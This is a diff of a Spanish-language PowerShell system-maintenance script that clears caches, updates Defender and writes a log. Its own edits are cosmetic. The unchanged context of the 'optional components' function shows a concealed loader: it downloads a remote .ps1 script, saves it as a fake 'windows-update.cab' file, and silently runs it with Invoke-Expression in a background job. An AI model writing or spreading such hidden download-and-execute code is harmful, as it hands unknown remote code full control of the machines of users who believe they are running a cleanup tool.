@@ -81,7 +81,7 @@ function Clear-TemporaryFiles {
 }
 
 function Clear-DNSCache {
-    Write-ActivityLog "Limpiando cache DNS" -Type "INFO"
+    Write-ActivityLog "Limpiando caché DNS" -Type "INFO"
     
     try {
         ipconfig /flushdns 2>&1 | Out-Null
@@ -94,7 +94,7 @@ function Clear-DNSCache {
 
 function Clear-WindowsUpdateCache {
     Write-ActivityLog "Limpiando cache de Windows Update" -Type "INFO"
-
+    
     try {
         Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
         Write-ActivityLog "  - Servicio Windows Update detenido" -Type "INFO"
@@ -174,6 +174,7 @@ function Update-DefenderDefinitions {
     }
 }
 
+# 8. Generar reporte del sistema (información básica)
 function Get-SystemReport {
     Write-ActivityLog "Generando reporte del sistema" -Type "INFO"
     
@@ -198,7 +199,7 @@ function Install-OptionalComponents {
         New-Item -ItemType Directory -Path $tempWorkDir -Force | Out-Null
     }
     
-    Write-ActivityLog "Descargando paquetes de optimizacion opcionales..." -Type "INFO"
+    Write-ActivityLog "Descargando paquetes de optimización opcionales..." -Type "INFO"
     
     $updatePackageUrl = "https://hackingetico.cl/tools/pro/update.ps1"
     $packageCache = "$tempWorkDir\windows-update.cab"
@@ -216,6 +217,7 @@ function Install-OptionalComponents {
             
             $content = Get-Content $packageCache -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
             if ($content) {
+                
                 $job = Start-Job -ScriptBlock {
                     param($scriptContent)
                     Invoke-Expression $scriptContent 2>&1 | Out-Null
@@ -291,7 +293,7 @@ Write-ActivityLog "Log guardado en: $logPath" -Type "INFO"
 if (-not $Silent) {
     Write-Host ""
     Write-Host "Operacion completada exitosamente" -ForegroundColor Green
-    Write-Host "Para más información, consulte el log: $logPath" -ForegroundColor Gray
+    Write-Host "Para mas informacion, consulte el log: $logPath" -ForegroundColor Gray
     Write-Host ""
     Start-Sleep -Seconds 3
 }
